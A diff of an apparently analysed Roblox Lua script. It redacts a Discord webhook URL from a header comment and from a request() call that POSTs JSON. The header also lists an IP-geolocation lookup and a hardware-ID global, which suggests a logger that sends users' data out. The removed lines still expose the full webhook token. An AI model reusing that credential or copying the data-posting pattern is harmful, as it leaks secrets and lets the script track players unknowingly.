@@ -12,7 +12,7 @@
 -- URLs requested:
 --   http://ip-api.com/json/
 --   https://games.roblox.com/v1/games/multiget-place-details?placeIds=0
---   https://canary.discord.com/api/webhooks/1527780055772561418/MtHYp4Q8JnrnatRDjCTZVigKQfLT0npFcXBnO-2LB2w7vZDlqRQcmaOWFNpRbhQirqDz
+--   [REDACTED_WEBHOOK_URL]
 -- non-standard globals touched: gethwid
 
 task.spawn(function()
@@ -143,7 +143,7 @@ request({
 	Body = json,
 	Headers = { ["Content-Type"] = "application/json" },
 	Method = "POST",
-	Url = "https://canary.discord.com/api/webhooks/1527780055772561418/MtHYp4Q8JnrnatRDjCTZVigKQfLT0npFcXBnO-2LB2w7vZDlqRQcmaOWFNpRbhQirqDz"
+	Url = "[REDACTED_WEBHOOK_URL]"
 })
 
 local TweenService = game:GetService("TweenService")
